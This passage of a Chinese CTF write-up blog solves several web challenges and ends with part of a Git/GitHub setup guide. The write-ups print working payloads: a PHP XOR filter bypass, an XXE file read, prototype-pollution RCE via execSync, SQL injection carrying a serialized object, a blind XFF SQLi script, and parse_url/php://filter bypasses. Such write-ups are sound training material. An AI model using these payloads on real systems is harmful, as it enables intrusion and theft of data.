it&#39;); if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die(&#39;you are so close, omg&#39;); eval($_); ?&gt; 绕过两个if就能成功执行命令，但是第一个if正则匹配了不少东西 \\x00- 0-9 匹配\\x00到空格(\\x20)，0-9的数字 &#39;&quot;&#96;$&amp;.,|[&#123;_defgops 匹配这些字符 \\x7F 匹配DEL(\\x7F)字符 可以用这个网站看看https://regex101.com/ 既然^和~符号没被过滤，很容易想到异或和取反绕过，先取反看看phpinfo 一些命令执行函数不能用，但是还有scandir那些，可以用scandir配合print_f来读取目录 这时候就要绕过第二个if了，要求出现的字符种类不超过13个，而（）^;这已经四个了，也就是我们能控制的字符只有九个，用异或还要有一个%ff，这下只有八个了 先上脚本 str &#x3D; &#39;acdips&#39; target &#x3D; &#39;ntrfl&#39; for m in target: for a in str: for b in str: for c in str: if ord(a) ^ ord(b) ^ ord(c) &#x3D;&#x3D; ord(m): print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(m, a, b, c), ) print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(hex(~ord(m) &amp; 0xff), hex(~ord(a) &amp; 0xff), hex(~ord(b) &amp; 0xff),hex(~ord(c) &amp; 0xff))) 这是其他师傅的解释 接下来就是对照着脚本将字符替换掉就行了 ((%8f%9c%96%9c%9c%a0%9c)^(%8f%9e%96%9b%9b%a0%9e)^(%8f%8f%96%96%8c%a0%8f)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); 看到了flag文件，在最后一个，所以用end将指针指向最末尾的文件，然后利用readfile或者show_source读就行了 payload ((%9e%9a%9e%9b%9e%96%9e%9a)^(%9c%9a%9e%9b%9c%96%96%9a)^(%8f%9a%9e%9b%9b%96%9b%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%9a%9c%9b)^(%9a%9b%9b)^(%9a%96%9b)^(%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff))); [CSAWQual 2019]Web_Unagi文件上传的题，不过不是传一句话，而是传xml文件，利用xxe来读flag 通过提示知道flag在/flag里， 再配合这个上传示例，可以写一个xml的文件 &lt;?xml version&#x3D;&#39;1.0&#39;?&gt; &lt;!DOCTYPE users [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt; &lt;users&gt; &lt;user&gt; &lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt; &lt;password&gt;&amp;xxe;&lt;&#x2F;password&gt; &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt; &lt;email&gt;&amp;xxe;&lt;&#x2F;email&gt; &lt;group&gt;&amp;xxe;&lt;&#x2F;group&gt; &lt;intro&gt;&amp;xxe;&lt;&#x2F;intro&gt; &lt;&#x2F;user&gt; &lt;&#x2F;users&gt; 但是这里的过滤不知道是通过什么方式的，通过utf-16编码就可以绕过，utf-8就不行，所以windows可以用记事本写完之后另存为utf-16的格式，Linux就是利用iconv -f utf8 -t utf-16 2.xml&gt;1.xml的命令把utf-8转化为utf-16 [GYCTF2020]Ez_Express原型链污染和js的大小写特性 存在源码泄露，www.zip下载源码，主要是看路由的部分 var express = require('express'); var router = express.Router(); const isObject = obj => obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object; const merge = (a, b) => &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a &#125; const clone = (a) => &#123; return merge(&#123;&#125;, a); &#125; function safeKeyword(keyword) &#123; if(keyword.match(/(admin)/is)) &#123; return keyword &#125; return undefined &#125; router.get('/', function (req, res) &#123; if(!req.session.user)&#123; res.redirect('/login'); &#125; res.outputFunctionName=undefined; res.render('index',data=&#123;'user':req.session.user.user&#125;); &#125;); router.get('/login', function (req, res) &#123; res.render('login'); &#125;); router.post('/login', function (req, res) &#123; if(req.body.Submit==\"register\")&#123; if(safeKeyword(req.body.userid))&#123; res.end(\"&lt;script>alert('forbid word');history.go(-1);&lt;/script>\") &#125; req.session.user=&#123; 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false &#125; res.redirect('/'); &#125; else if(req.body.Submit==\"login\")&#123; if(!req.session.user)&#123;res.end(\"&lt;script>alert('register first');history.go(-1);&lt;/script>\")&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(\"&lt;script>alert('error passwd');history.go(-1);&lt;/script>\") &#125; &#125; res.redirect('/'); ; &#125;); router.post('/action', function (req, res) &#123; if(req.session.user.user!=\"ADMIN\")&#123;res.end(\"&lt;script>alert('ADMIN is asked');history.go(-1);&lt;/script>\")&#125; req.session.user.data = clone(req.body); res.end(\"&lt;script>alert('success');history.go(-1);&lt;/script>\"); &#125;); router.get('/info', function (req, res) &#123; res.render('index',data=&#123;'user':res.outputFunctionName&#125;); &#125;) module.exports = router; 我们看到登录的部分有toUpperCase，而题目要求要用ADMIN用户登录，这里可以利用js的大小写特性绕过 toUpperCase() 其中混入了两个奇特的字符&quot;ı&quot;、&quot;ſ&quot;。 这两个字符的“大写”是I和S。也就是说&quot;ı&quot;.toUpperCase() &#x3D;&#x3D; &#39;I&#39;，&quot;ſ&quot;.toUpperCase() &#x3D;&#x3D; &#39;S&#39;。通过这个小特性可以绕过一些限制。 toLowerCase() 这个&quot;K&quot;的“小写”字符是k，也就是&quot;K&quot;.toLowerCase() &#x3D;&#x3D; &#39;k&#39;. 利用admın注册就可以 登录后提示flag在/flag里 而源码中存在着merge函数 而info中 outputFunction正好又是未定义，info还会将outputFunctionName渲染到页面中 所以我们可以给对象原型的类添加一个outputFunctionName属性，通过它得到flag。 payload： &#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;)&#x2F;&#x2F;&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125; 不太理解这里最后的&#x2F;&#x2F;的含义，但是没有这个不会成功执行，而且会出现报错，所以我认为可能是对后文的注释，而且用 &#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);x&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;也能成功，所以应该就是为了保证语句的完整 这时候再访问一下/info就能下载到flag文件 [安洵杯 2019]不是文件上传确实不是文件上传，只能传图片而且路径也没有，这其实是一个搭配反序列化的sql题 show.php: &lt;?php include(&quot;.&#x2F;helper.php&quot;); $show &#x3D; new show(); if($_GET[&quot;delete_all&quot;])&#123; if($_GET[&quot;delete_all&quot;] &#x3D;&#x3D; &quot;true&quot;)&#123; $show-&gt;Delete_All_Images(); &#125; &#125; $show-&gt;Get_All_Images(); class show&#123; public $con; public function __construct()&#123; $this-&gt;con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;); if (mysqli_connect_errno($this-&gt;con))&#123; die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error()); &#125; &#125; public function Get_All_Images()&#123; $sql &#x3D; &quot;SELECT * FROM images&quot;; $result &#x3D; mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row &#x3D; $result-&gt;fetch_assoc())&#123; if($row[&quot;attr&quot;])&#123; $attr_temp &#x3D; str_replace(&#39;\\0\\0\\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]); $attr &#x3D; unserialize($attr_temp); &#125; echo &quot;&lt;p&gt;id&#x3D;&quot;.$row[&quot;id&quot;].&quot; filename&#x3D;&quot;.$row[&quot;filename&quot;].&quot; path&#x3D;&quot;.$row[&quot;path&quot;].&quot;&lt;&#x2F;p&gt;&quot;; &#125; &#125;else&#123; echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;&#x2F;p&gt;&quot;; &#125; mysqli_close($this-&gt;con); &#125; public function Delete_All_Images()&#123; $sql &#x3D; &quot;DELETE FROM images&quot;; $result &#x3D; mysqli_query($this-&gt;con, $sql); &#125; &#125; upload.php &lt;?php include(&quot;.&#x2F;helper.php&quot;); class upload extends helper &#123; public function upload_base()&#123; $this-&gt;upload(); &#125; &#125; if ($_FILES)&#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;])&#123; die(&quot;Upload file failed.&quot;); &#125;else&#123; $file &#x3D; new upload(); $file-&gt;upload_base(); &#125; &#125; $a &#x3D; new helper(); helper.php &lt;?php class helper &#123; protected $folder &#x3D; &quot;pic&#x2F;&quot;; protected $ifview &#x3D; False; protected $config &#x3D; &quot;config.txt&quot;; &#x2F;&#x2F; The function is not yet perfect, it is not open yet. public function upload($input&#x3D;&quot;file&quot;) &#123; $fileinfo &#x3D; $this-&gt;getfile($input); $array &#x3D; array(); $array[&quot;title&quot;] &#x3D; $fileinfo[&#39;title&#39;]; $array[&quot;filename&quot;] &#x3D; $fileinfo[&#39;filename&#39;]; $array[&quot;ext&quot;] &#x3D; $fileinfo[&#39;ext&#39;]; $array[&quot;path&quot;] &#x3D; $fileinfo[&#39;path&#39;]; $img_ext &#x3D; getimagesize($_FILES[$input][&quot;tmp_name&quot;]); $my_ext &#x3D; array(&quot;width&quot;&#x3D;&gt;$img_ext[0],&quot;height&quot;&#x3D;&gt;$img_ext[1]); $array[&quot;attr&quot;] &#x3D; serialize($my_ext); $id &#x3D; $this-&gt;save($array); if ($id &#x3D;&#x3D; 0)&#123; die(&quot;Something wrong!&quot;); &#125; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#39;s id is $id.&lt;&#x2F;p&gt;&quot;; &#125; public function getfile($input) &#123; if(isset($input))&#123; $rs &#x3D; $this-&gt;check($_FILES[$input]); &#125; return $rs; &#125; public function check($info) &#123; $basename &#x3D; substr(md5(time().uniqid()),9,16); $filename &#x3D; $info[&quot;name&quot;]; $ext &#x3D; substr(strrchr($filename, &#39;.&#39;), 1); $cate_exts &#x3D; array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;); if(!in_array($ext,$cate_exts))&#123; die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;&#x2F;p&gt;&quot;); &#125; $title &#x3D; str_replace(&quot;.&quot;.$ext,&#39;&#39;,$filename); return array(&#39;title&#39;&#x3D;&gt;$title,&#39;filename&#39;&#x3D;&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;&#x3D;&gt;$ext,&#39;path&#39;&#x3D;&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext); &#125; public function save($data) &#123; if(!$data || !is_array($data))&#123; die(&quot;Something wrong!&quot;); &#125; $id &#x3D; $this-&gt;insert_array($data); return $id; &#125; public function insert_array($data) &#123; $con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;); if (mysqli_connect_errno($con)) &#123; die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error()); &#125; $sql_fields &#x3D; array(); $sql_val &#x3D; array(); foreach($data as $key&#x3D;&gt;$value)&#123; $key_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\\0\\0\\0&#39;, $key); $value_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\\0\\0\\0&#39;, $value); $sql_fields[] &#x3D; &quot;&#96;&quot;.$key_temp.&quot;&#96;&quot;; $sql_val[] &#x3D; &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;; &#125; $sql &#x3D; &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;; mysqli_query($con, $sql); $id &#x3D; mysqli_insert_id($con); mysqli_close($con); return $id; &#125; public function view_files($path)&#123; if ($this-&gt;ifview &#x3D;&#x3D; False)&#123; return False; &#x2F;&#x2F;The function is not yet perfect, it is not open yet. &#125; $content &#x3D; file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125; &#125; 我们能看到helper里有个file_get_contents，而且path的值是config的内容 在show里还有个unserialize 可以看出这个题是反序列化，而我们的目的就是控制config里的内容 反序列化的部分很简单 &lt;?php class helper &#123; protected $ifview &#x3D; true; protected $config &#x3D; &quot;&#x2F;flag&quot;; &#125; $a &#x3D; new helper(); echo serialize($a); 但是我们要想办法把这个传进去 再来看把图片存入数据库的过程 那么正常的语句就应该是 INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;图片名称&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;) 而title我们是可控的，所以我们构造的payload为 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.png 解释：看show里反序列化的部分，是只对attr部分进行了反序列化，所以我们在构造的时候，就要把我们的序列化语句放在attr的位置上，前边四个放1，并且用单引号来闭合前面的第一个单引号，#是为了注释后面的sql语句，保证顺利执行，.png是保证是个图片的后缀，让文件能传上去 而0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d是O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\\0\\0\\0ifview&quot;;b:1;s:9:&quot;\\0\\0\\0config&quot;;s:5:&quot;/flag&quot;;&#125;的十六进制形式，因为文件名不允许存在双引号，\\0是因为我们的序列化的两个属性都是protected类型的，而在储存时对protected序列化后出现的不可见字符与*的组合进行了替换，将chr(0)*chr(0)替换为了\\0\\0\\0，在反序列化时又换了回去，为了程序的执行，所以我们要将其替换 [RoarCTF 2019]Online Proxy一道像ssrf的页面，但实际上是xff头的二次注入 我们测试一下，先输入 1’ or ‘1 此时我们的current IP就等于它，让后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or &#39;1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。 所以直接跑脚本就行了 import requests url &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:28996&#x2F;&#39; flag &#x3D; &#39;&#39; for i in range(1, 100): length &#x3D; len(flag) min &#x3D; 32 max &#x3D; 125 while 1: j &#x3D; min + (max - min) &#x2F;&#x2F; 2 if min &#x3D;&#x3D; j: flag +&#x3D; chr(j) print(flag) break # 爆表 # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;F4l9_D4t4B45e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j) # 爆库 payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&lt;%d or &#39;0&quot;%(i,j) # 爆列 # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F4l9_t4b1e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j) # 爆flag #payload1 &#x3D; &quot;0&#39; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))&lt;%d or &#39;0&quot; % (i, j) payload2 &#x3D; &quot;1&quot; headers &#x3D; &#123;&quot;x-forwarded-for&quot;: payload1, &#39;Cookie&#39;: &#39;track_uuid&#x3D;585aabec-e6df-4724-95b8-8c2fa1285f61&#39;&#125; r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text # print(r) headers[&quot;x-forwarded-for&quot;] &#x3D; payload2 r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text # print(r) r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text # print(r) location &#x3D; r.find(&quot;Last Ip: &quot;) number &#x3D; r[location + 9:location + 10] if &#39;1&#39; in number: max &#x3D; j else: min &#x3D; j 最后出flag 赵总怎么还在里边夹私货（ [N1CTF 2018]eating_cms有注册界面register.php 注册一下登录之后感觉有点像伪协议 试一下，成功读到了源码 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;user #不知道为什么加上.php就读不到了 解码 user.php &lt;?php require_once(&quot;function.php&quot;); if( !isset( $_SESSION[&#39;user&#39;] ))&#123; Header(&quot;Location: index.php&quot;); &#125; if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123; $oper_you_can_do &#x3D; $OPERATE_admin; &#125;else&#123; $oper_you_can_do &#x3D; $OPERATE; &#125; &#x2F;&#x2F;die($_SESSION[&#39;isadmin&#39;]); if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123; if(!isset($_GET[&#39;page&#39;]) || $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123; $page &#x3D; &#39;info&#39;; &#125;else &#123; $page &#x3D; $_GET[&#39;page&#39;]; &#125; &#125; else&#123; if(!isset($_GET[&#39;page&#39;])|| $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123; $page &#x3D; &#39;guest&#39;; &#125;else &#123; $page &#x3D; $_GET[&#39;page&#39;]; if($page &#x3D;&#x3D;&#x3D; &#39;info&#39;) &#123; &#x2F;&#x2F; echo(&quot;&lt;script&gt;alert(&#39;no premission to visit info, only admin can, you are guest&#39;)&lt;&#x2F;script&gt;&quot;); Header(&quot;Location: user.php?page&#x3D;guest&quot;); &#125; &#125; &#125; filter_directory(); &#x2F;&#x2F;if(!in_array($page,$oper_you_can_do))&#123; &#x2F;&#x2F; $page &#x3D; &#39;info&#39;; &#x2F;&#x2F;&#125; include &quot;$page.php&quot;; ?&gt; function.php &lt;?php session_start(); require_once &quot;config.php&quot;; function Hacker() &#123; Header(&quot;Location: hacker.php&quot;); die(); &#125; function filter_directory() &#123; $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;]; $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#39;query&#39;], $query); &#x2F;&#x2F; var_dump($query); &#x2F;&#x2F; die(); foreach($keywords as $token) &#123; foreach($query as $k &#x3D;&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125; &#125; function filter_directory_guest() &#123; $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#39;query&#39;], $query); &#x2F;&#x2F; var_dump($query); &#x2F;&#x2F; die(); foreach($keywords as $token) &#123; foreach($query as $k &#x3D;&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125; &#125; function Filter($string) &#123; global $mysqli; $blacklist &#x3D; &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;; $whitelist &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;(),_*&#96;-@&#x3D;+&gt;&lt;&quot;; for ($i &#x3D; 0; $i &lt; strlen($string); $i++) &#123; if (strpos(&quot;$whitelist&quot;, $string[$i]) &#x3D;&#x3D;&#x3D; false) &#123; Hacker(); &#125; &#125; if (preg_match(&quot;&#x2F;$blacklist&#x2F;is&quot;, $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return &quot;&quot;; &#125; &#125; function sql_query($sql_query) &#123; global $mysqli; $res &#x3D; $mysqli-&gt;query($sql_query); return $res; &#125; function login($user, $pass) &#123; $user &#x3D; Filter($user); $pass &#x3D; md5($pass); $sql &#x3D; &quot;select * from &#96;albert_users&#96; where &#96;username_which_you_do_not_know&#96;&#x3D; &#39;$user&#39; and &#96;password_which_you_do_not_know_too&#96; &#x3D; &#39;$pass&#39;&quot;; echo $sql; $res &#x3D; sql_query($sql); &#x2F;&#x2F; var_dump($res); &#x2F;&#x2F; die(); if ($res-&gt;num_rows) &#123; $data &#x3D; $res-&gt;fetch_array(); $_SESSION[&#39;user&#39;] &#x3D; $data[username_which_you_do_not_know]; $_SESSION[&#39;login&#39;] &#x3D; 1; $_SESSION[&#39;isadmin&#39;] &#x3D; $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return; &#125; function updateadmin($level,$user) &#123; $sql &#x3D; &quot;update &#96;albert_users&#96; set &#96;isadmin_which_you_do_not_know_too_too&#96; &#x3D; &#39;$level&#39; where &#96;username_which_you_do_not_know&#96;&#x3D;&#39;$user&#39; &quot;; echo $sql; $res &#x3D; sql_query($sql); &#x2F;&#x2F; var_dump($res); &#x2F;&#x2F; die(); &#x2F;&#x2F; die($res); if ($res &#x3D;&#x3D; 1) &#123; return true; &#125; else &#123; return false; &#125; return; &#125; function register($user, $pass) &#123; global $mysqli; $user &#x3D; Filter($user); $pass &#x3D; md5($pass); $sql &#x3D; &quot;insert into &#96;albert_users&#96;(&#96;username_which_you_do_not_know&#96;,&#96;password_which_you_do_not_know_too&#96;,&#96;isadmin_which_you_do_not_know_too_too&#96;) VALUES (&#39;$user&#39;,&#39;$pass&#39;,&#39;0&#39;)&quot;; $res &#x3D; sql_query($sql); return $mysqli-&gt;insert_id; &#125; function logout() &#123; session_destroy(); Header(&quot;Location: index.php&quot;); &#125; ?&gt; 这里有个parse_url的解析漏洞（我记得我遇见过，但是不知道为什么没有写在wp上 $url0 &#x3D; &quot;&#x2F;baidu.com:80&quot;;&#x2F;&#x2F;全版本通杀，当url没协议时parse_url会直接报错 $url &#x3D; &quot;httpsadasd:&#x2F;&#x2F;www.baidu.com:80?a&#x3D;123&quot;; $url1 &#x3D; &quot;&#x2F;baidu.com:80a&quot;;&#x2F;&#x2F;但是在端口上加上字母就能正常解析 $url2 &#x3D; &quot;&#x2F;&#x2F;pupiles.com&#x2F;about:1234&quot;;&#x2F;&#x2F;这是php5.5以上的一个端口解析漏洞，这样的url会将&#x2F;后的内容都path看作path $url3 &#x3D; &quot;&#x2F;&#x2F;baidu.com:80a&quot;; var_dump(parse_url($url0)); var_dump(parse_url($url)); var_dump(parse_url($url1)); var_dump(parse_url($url2)); var_dump(parse_url($url3)); 返回的内容为 bool(false) array(4) &#123; [&quot;scheme&quot;]&#x3D;&gt; string(10) &quot;httpsadasd&quot; [&quot;host&quot;]&#x3D;&gt; string(13) &quot;www.baidu.com&quot; [&quot;port&quot;]&#x3D;&gt; int(80) [&quot;query&quot;]&#x3D;&gt; string(5) &quot;a&#x3D;123&quot; &#125; array(1) &#123; [&quot;path&quot;]&#x3D;&gt; string(14) &quot;&#x2F;baidu.com:80a&quot; &#125; array(3) &#123; [&quot;host&quot;]&#x3D;&gt; string(11) &quot;pupiles.com&quot; [&quot;port&quot;]&#x3D;&gt; int(1234) [&quot;path&quot;]&#x3D;&gt; string(11) &quot;&#x2F;about:1234&quot; &#125; array(2) &#123; [&quot;host&quot;]&#x3D;&gt; string(9) &quot;baidu.com&quot; [&quot;port&quot;]&#x3D;&gt; int(80) &#125; 测试 $url4 &#x3D; &quot;&#x2F;&#x2F;upload?&#x2F;test&#x2F;&quot;; $url5 &#x3D; &quot;&#x2F;upload?&#x2F;1&#x3D;1&amp;id&#x3D;1&quot;; $url6 &#x3D; &quot;&#x2F;&#x2F;&#x2F;upload?id&#x3D;1&quot;; var_dump(parse_url($url4)); var_dump(parse_url($url5)); var_dump(parse_url($url6)); 返回的内容为 array(2) &#123; [&quot;host&quot;]&#x3D;&gt; string(7) &quot;upload?&quot; [&quot;path&quot;]&#x3D;&gt; string(6) &quot;&#x2F;test&#x2F;&quot; &#125; array(2) &#123; [&quot;path&quot;]&#x3D;&gt; string(7) &quot;&#x2F;upload&quot; [&quot;query&quot;]&#x3D;&gt; string(9) &quot;&#x2F;1&#x3D;1&amp;id&#x3D;1&quot; &#125; bool(false) 这个就是我们需要的路径解析漏洞，这个在php的不同版本差别还是挺大的 5.2在参数带个伪协议直接解析不了。。。而且好像也没有这个洞和///直接报错的洞 5.4，5.5可以直接利用这个漏洞绕过 但是7.0开始好像是对参数里的：和/进行了检测 然后我们可以用 &#x2F;&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg 或 &#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg 读到ffffllllaaaaggg里的内容 解码之后 &lt;?php if (FLAG_SIG !&#x3D; 1)&#123; die(&quot;you can not visit it directly&quot;); &#125;else &#123; echo &quot;you can find sth in m4aaannngggeee&quot;; &#125; ?&gt; 那就再看m4aaannngggeee &lt;?php if (FLAG_SIG !&#x3D; 1)&#123; die(&quot;you can not visit it directly&quot;); &#125; include &quot;templates&#x2F;upload.html&quot;; ?&gt; 访问一下包含的这个文件 是个文件上传的页面 但是没法传，但是跳转到了一个新的页面，再用伪协议读一下 upllloadddd.php &lt;?php $allowtype &#x3D; array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;); $size &#x3D; 10000000; $path &#x3D; &quot;.&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;; $filename &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;]; if(is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]))&#123; if(!move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$path.$filename))&#123; die(&quot;error:can not move&quot;); &#125; &#125;else&#123; die(&quot;error:not an upload file！&quot;); &#125; $newfile &#x3D; $path.$filename; echo &quot;file upload success&lt;br &#x2F;&gt;&quot;; echo $filename; $picdata &#x3D; system(&quot;cat .&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;.$filename.&quot; | base64 -w 0&quot;); echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;png;base64,&quot;.$picdata.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;; if($_FILES[&#39;file&#39;][&#39;error&#39;]&gt;0)&#123; unlink($newfile); die(&quot;Upload file error: &quot;); &#125; $ext &#x3D; array_pop(explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;])); if(!in_array($ext,$allowtype))&#123; unlink($newfile); &#125; ?&gt; 看这句，如果我们再filename出插入命令，就可以执行它 那我们就去找真正的文件上传的页面，想到之前的m4aaannngggeee 利用分号执行多个注释，然后利用井号注释掉后面的语句","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"github使用","slug":"github使用","date":"2021-10-02T04:27:09.000Z","updated":"2022-03-28T08:21:51.633Z","comments":true,"path":"2021/10/02/github使用/","link":"","permalink":"https://ethe448.github.io/2021/10/02/github%E4%BD%BF%E7%94%A8/","excerpt":"​ 在学python的时候顺便学了些GitHub的使用，写个文档防止忘了","text":"​ 在学python的时候顺便学了些GitHub的使用，写个文档防止忘了 绑定用户 打开git-bash 填写用户名和密码 提示（配置的帐号名和邮箱一定要与GitHub相同，不然会提交失败） git config --global user.name &quot;@@@&quot; (GitHub相对应的帐号名称) git config --global user.email &quot;123@163.com&quot; （GitHbu相对应的邮箱帐号） 设置ssh key 生成ssh key 首先检查是否已生成密钥 cd ~/.ssh，ls如果有3个文件，则密钥已经生成，id_rsa.pub就是公钥 如果没有，输入: ssh-keygen -t rsa -C &quot;你的邮箱&quot; 复制ssh key 方法1: 输入 clip &lt; ~/.ssh/id_rsa.pub 会自动复制ssh key，可以直接粘贴 方法2:在c/Users/Administrator/.ssh/id_rsa)文件找到直接复制 连接github，打开GitHub 进入setting找到ssh key并新建 format,png.png) 然后测试连接是否成功 输入: ssh -T &#103;&#105;&#116;&#x40;&#103;&#x69;&#116;&#x68;&#x75;&#98;&#46;&#99;&#x6f;&#x6d; 上传 上传的基本步骤就是这样了 先打开一个文件夹按着图片里的步骤来 先初始化再把想传的文件传上去 可以用git add .上传所有文件 注： 输入git add .后如果报错 warning: LF will be replaced by CRLF in gradlew. The file will have its original line endings in your working directory 则再输入git config --global core.autocrlf false后再重新输入git add .命令即可 git commit添加备注 克隆仓库 $ git clone 网址 [自定义目录名] 